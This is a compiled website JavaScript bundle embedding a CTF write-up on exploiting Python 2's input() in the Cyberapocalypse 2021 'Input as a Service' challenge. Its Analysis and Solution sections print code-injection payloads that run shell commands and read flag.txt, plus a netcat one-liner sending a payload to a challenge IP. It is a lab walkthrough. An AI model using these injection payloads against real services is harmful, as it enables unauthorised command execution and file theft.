"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[2587],{3905:(e,t,n)=>{n.d(t,{Zo:()=>c,kt:()=>h});var a=n(7294);function r(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function i(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){r(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function l(e,t){if(null==e)return{};var n,a,r=function(e,t){if(null==e)return{};var n,a,r={},o=Object.keys(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||(r[n]=e[n]);return r}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(r[n]=e[n])}return r}var p=a.createContext({}),s=function(e){var t=a.useContext(p),n=t;return e&&(n="function"==typeof e?e(t):i(i({},t),e)),n},c=function(e){var t=s(e.components);return a.createElement(p.Provider,{value:t},e.children)},u="mdxType",y={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},m=a.forwardRef((function(e,t){var n=e.components,r=e.mdxType,o=e.originalType,p=e.parentName,c=l(e,["components","mdxType","originalType","parentName"]),u=s(n),m=r,h=u["".concat(p,".").concat(m)]||u[m]||y[m]||o;return n?a.createElement(h,i(i({ref:t},c),{},{components:n})):a.createElement(h,i({ref:t},c))}));function h(e,t){var n=arguments,r=t&&t.mdxType;if("string"==typeof e||r){var o=n.length,i=new Array(o);i[0]=m;var l={};for(var p in t)hasOwnProperty.call(t,p)&&(l[p]=t[p]);l.originalType=e,l[u]="string"==typeof e?e:r,i[1]=l;for(var s=2;s<o;s++)i[s]=n[s];return a.createElement.apply(null,i)}return a.createElement.apply(null,n)}m.displayName="MDXCreateElement"},3857:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>p,contentTitle:()=>i,default:()=>y,frontMatter:()=>o,metadata:()=>l,toc:()=>s});var a=n(7462),r=(n(7294),n(3905));const o={slug:"input-as-a-service-cyberapocalypse-2021-ctf",title:"Input as a Service - Cyberapocalypse 2021 CTF",description:"This is a writeup for the Input as a Service challenge, part of the Hack the box's Cyberapocalypse CTF 2021, category Misc.",authors:"kiroki",tags:["Cyber Security","CTF"]},i=void 0,l={permalink:"/blog/input-as-a-service-cyberapocalypse-2021-ctf",source:"@site/blog/2021-04-30-09:48:38input-as-a-service-cyberapocalypse-2021-ctf.md",title:"Input as a Service - Cyberapocalypse 2021 CTF",description:"This is a writeup for the Input as a Service challenge, part of the Hack the box's Cyberapocalypse CTF 2021, category Misc.",date:"2021-04-30T00:00:00.000Z",formattedDate:"April 30, 2021",tags:[{label:"Cyber Security",permalink:"/blog/tags/cyber-security"},{label:"CTF",permalink:"/blog/tags/ctf"}],readingTime:1.695,hasTruncateMarker:!0,authors:[{name:"Kiril Panayotov Blagoev",title:"Admin",url:"https://github.com/tihawk",imageURL:"https://github.com/tihawk.png",key:"kiroki"}],frontMatter:{slug:"input-as-a-service-cyberapocalypse-2021-ctf",title:"Input as a Service - Cyberapocalypse 2021 CTF",description:"This is a writeup for the Input as a Service challenge, part of the Hack the box's Cyberapocalypse CTF 2021, category Misc.",authors:"kiroki",tags:["Cyber Security","CTF"]},prevItem:{title:"Key Mission - Cyberapocalypse 2021 CTF",permalink:"/blog/key-mission-cyberapocalypse-2021-ctf"},nextItem:{title:"BlitzProp - Cyberapocalypse 2021 CTF",permalink:"/blog/blitzprop-cyberapocalypse-2021-ctf"}},p={authorsImageUrls:[void 0]},s=[{value:"Prompt",id:"prompt",level:3},{value:"Recon",id:"recon",level:3},{value:"Analysis",id:"analysis",level:3},{value:"Solution",id:"solution",level:3}],c={toc:s},u="wrapper";function y(e){let{components:t,...n}=e;return(0,r.kt)(u,(0,a.Z)({},c,n,{components:t,mdxType:"MDXLayout"}),(0,r.kt)("p",null,"This is a writeup for the Input as a Service challenge, part of the Hack the box's Cyberapocalypse CTF 2021, category Misc."),(0,r.kt)("h3",{id:"prompt"},"Prompt"),(0,r.kt)("p",null,"In order to blend with the extraterrestrials, we need to talk and sound like them. Try some phrases in order to check if you can make them believe you are one of them."),(0,r.kt)("h3",{id:"recon"},"Recon"),(0,r.kt)("p",null,"We can netcat to a service at some address given to us. Upon doing so, we are prompted by the question ",(0,r.kt)("em",{parentName:"p"},'"Do you sound like an alien?"'),", followed by what looks like a python prompt"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"Do you sound like an alien?\n>>>\n")),(0,r.kt)("p",null,"If we supply it something random, it will spit out a python error trace."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'Do you sound like an alien?\n>>> lolwut\n\n\nTraceback (most recent call last):\n  File "input_as_a_service.py", line 16, in <module>\n    main()\n  File "input_as_a_service.py", line 12, in main\n    text = input(\' \')\n  File "<string>", line 1, in <module>\nNameError: name \'lolwut\' is not defined\n')),(0,r.kt)("h3",{id:"analysis"},"Analysis"),(0,r.kt)("p",null,"We see in the traceback, that we're supplying info to an ",(0,r.kt)("inlineCode",{parentName:"p"},"input")," function inside of python2.x. This method has a well known vulnerability, which is that it tries to run the value of ",(0,r.kt)("inlineCode",{parentName:"p"},"input()")," as code."),(0,r.kt)("p",null,"We can easily make use of that, and see if we can't invoke the ",(0,r.kt)("inlineCode",{parentName:"p"},"os")," module of python, and maybe do some filesystem recon. We can do that by sending the following line into the input"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-python"},'__import__("os").system("ls")\n')),(0,r.kt)("p",null,"And we will see, that one of the files is indeed ",(0,r.kt)("inlineCode",{parentName:"p"},"flag.txt"),"."),(0,r.kt)("h3",{id:"solution"},"Solution"),(0,r.kt)("p",null,"We can go as complicated as we like, but the most straightforward way to solve this particular challenge, is to invoke the ",(0,r.kt)("inlineCode",{parentName:"p"},"os")," module of python, and try to run ",(0,r.kt)("inlineCode",{parentName:"p"},"cat")," on the file we found ",(0,r.kt)("inlineCode",{parentName:"p"},"flag.txt"),"."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-python"},"[GCC 9.3.0]\nDo you sound like an alien?\n>>>\n\n __import__('os').system('cat flag.txt')\nCHTB{4li3n5_us3_pyth0n2.X?!}\n0\n")),(0,r.kt)("p",null,"And so, we get the flag"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"CHTB{4li3n5_us3_pyth0n2.X?!}\n")),(0,r.kt)("p",null,"I'll throw the following line here as well, for reference"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-python"},'echo \'int(().__class__.__base__.__subclasses__()[40]("flag.txt","r").read())\' | nc 188.166.145.178 31960 | grep -o CHTB{.*} --color=none\n')))}y.isMDXComponent=!0}}]);